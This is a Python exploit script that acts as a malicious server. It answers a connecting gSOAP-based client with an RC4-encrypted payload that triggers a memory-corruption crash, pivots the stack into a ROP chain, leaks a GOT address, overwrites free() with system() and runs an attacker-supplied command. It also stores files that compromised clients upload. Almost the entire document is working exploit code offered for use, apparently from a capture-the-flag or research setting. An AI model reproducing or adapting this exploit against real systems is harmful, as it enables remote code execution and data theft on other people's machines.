import socket
import struct
import pwn

#RC4 Implementation
def rc4_crypt( data , key ):
    
    S = range(256)
    j = 0
    out = []
    
    #KSA Phase
    for i in range(256):
        j = (j + S[i] + ord( key[i % len(key)] )) % 256
        S[i] , S[j] = S[j] , S[i]
    
    #PRGA Phase
    i = j = 0
    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))
        
    return ''.join(out)


s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 12345))
s.listen(100)

#0x00402845: add rsp, 0x68 ; pop rbx ; pop rbp ; ret  ;  (1 found)
ADD_RSP_68_POP_POP_RET = 0x00402845
# 0x00402994: add rsp, 0x0000000000000338 ; pop rbx ; pop rbp ; ret  ;  (1 found)
ADD_RSP_338_POP_POP_RET = 0x00402994
# 0x00402849: pop rbx ; pop rbp ; ret  ;  (28 found)
POP_POP_RET = 0x00402849
# 0x0040a043: pop rdi ; ret  ;  (1 found)
POP_RDI = 0x0040a043
# 0x0040a041: pop rsi ; pop r15 ; ret  ;  (1 found)
POP_RSI_R15 = 0x0040a041
# .got.plt _read
READ = 0x401B60
# .got.plt write
WRITE = 0x401A80
#0x0040a020: mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8] ;  (1 found)
RDX_SHIT = 0x0040a020
# 0x0040a03a: pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret  ;  (1 found)
POP_MANY = 0x0040a03a
# 0x0040a055: sub esp, 0x08 ; add rsp, 0x08 ; ret  ;  (1 found)
ADD_RSP_8_POP = 0x0040a055
# 0x00401fad: call rax ;  (3 found)
CALL_RAX = 0x00401fad
# 0x0040c18b: call qword [rdi+0x00] ;  (2 found)
CALL_RDI = 0x0040c18b
# 0x00401f15: pop rbp ; ret  ;  (59 found)
POP_RBP = 0x00401f15
# 0x00401fbc: call qword [rbp+0x48] ;  (1 found)
CALL_RBP = 0x00401fbc

# htons - useless function, used to studd RDX_SHIT indirect call
HTONS = 0x60d088

# free in .got.plt - we leak this, then override this
LEAK_ADDRESS = 0x60D018
LEAK_LENGTH = 8
# place to keep system arg
SYSTEM_ARG_ADDRESS = LEAK_ADDRESS + 8
SYSTEM_ARG_LENGTH = 8 #change this if you change the sent length in the client

key = 'this_is_preshared_key'

## WRITE 8 BYTES OF GOT.PLT FREE TO STDOUT
sent_buffer = pwn.cyclic(672) + pwn.p64(POP_MANY) + pwn.p64(0xFFFFFFFFFFFFFFFF) + pwn.p64(0) + pwn.p64(0x60d088) + pwn.p64(LEAK_LENGTH) + pwn.p64(0) + pwn.p64(0)
sent_buffer += pwn.p64(RDX_SHIT)
sent_buffer += pwn.p64(8) * 7
sent_buffer += pwn.p64(POP_RDI) + pwn.p64(1) + pwn.p64(POP_RSI_R15) + pwn.p64(LEAK_ADDRESS) + pwn.p64(0)
sent_buffer += pwn.p64(WRITE)

## READ SYSTEM ARG TO CLIENT
sent_buffer += pwn.p64(POP_MANY) + pwn.p64(0xFFFFFFFFFFFFFFFF) + pwn.p64(0) + pwn.p64(0x60d088) + pwn.p64(SYSTEM_ARG_LENGTH) + pwn.p64(0) + pwn.p64(0)
sent_buffer += pwn.p64(RDX_SHIT)
sent_buffer += pwn.p64(8) * 7
sent_buffer += pwn.p64(POP_RDI) + pwn.p64(0) + pwn.p64(POP_RSI_R15) + pwn.p64(SYSTEM_ARG_ADDRESS) + pwn.p64(0)
sent_buffer += pwn.p64(READ)

## RESEND TO CLIENT FOR DEBUG
sent_buffer += pwn.p64(POP_MANY) + pwn.p64(0xFFFFFFFFFFFFFFFF) + pwn.p64(0) + pwn.p64(0x60d088) + pwn.p64(8) + pwn.p64(0) + pwn.p64(0)
sent_buffer += pwn.p64(RDX_SHIT)
sent_buffer += pwn.p64(8) * 7
sent_buffer += pwn.p64(POP_RDI) + pwn.p64(1) + pwn.p64(POP_RSI_R15) + pwn.p64(LEAK_ADDRESS+8) + pwn.p64(0)
sent_buffer += pwn.p64(WRITE)

## OVERRIDE FREE IN PLT WITH SYSTEM CALCULATED BY CLIENT
sent_buffer += pwn.p64(POP_MANY) + pwn.p64(0xFFFFFFFFFFFFFFFF) + pwn.p64(0) + pwn.p64(0x60d088) + pwn.p64(LEAK_LENGTH) + pwn.p64(0) + pwn.p64(0)
sent_buffer += pwn.p64(RDX_SHIT)
sent_buffer += pwn.p64(8) * 7
sent_buffer += pwn.p64(POP_RDI) + pwn.p64(0) + pwn.p64(POP_RSI_R15) + pwn.p64(LEAK_ADDRESS) + pwn.p64(0)
sent_buffer += pwn.p64(READ)

## CALL OVERRIDDEN FREE/SYSTEM
sent_buffer += pwn.p64(POP_RDI) + pwn.p64(LEAK_ADDRESS+8)
sent_buffer += pwn.p64(POP_RBP) + pwn.p64(LEAK_ADDRESS-0x48)
sent_buffer += pwn.p64(CALL_RBP)


## Crash the thing. This is tricky - basically I fuzzed gSOAP to a call [rax], where RAX was from the buffer at offset 50248. Then we stackpivot into the beggining of the buffer, to our ropchain (at the 672th offset in the buffer)
sent_buffer += pwn.cyclic(50248-len(sent_buffer)) + struct.pack("<Q", ADD_RSP_338_POP_POP_RET)
left = 0x10000 - len(sent_buffer)
cy = pwn.cyclic(50248+left)[50248:]
sent_buffer += cy
sent_buffer = rc4_crypt(sent_buffer, key)

while True:
    cs, a = s.accept()
    print "Connection from", a
    cmd = cs.recv(4)
    print cmd
    if cmd == "ECHO":
        # Pwn!
        l, = struct.unpack("<L", cs.recv(4))
        print l
        data = cs.recv(l)
        print data.encode('hex')
        cs.send(struct.pack("<L", 0x10000))
        cs.sendall(sent_buffer)
    if cmd == "UPLD":
        # Dump uploaded file, to be decrypted by client
        l, = struct.unpack("<L", cs.recv(4))
        print l
        data = cs.recv(l)
        f = open('bin', 'w')
        f.write(data)
        f.close()
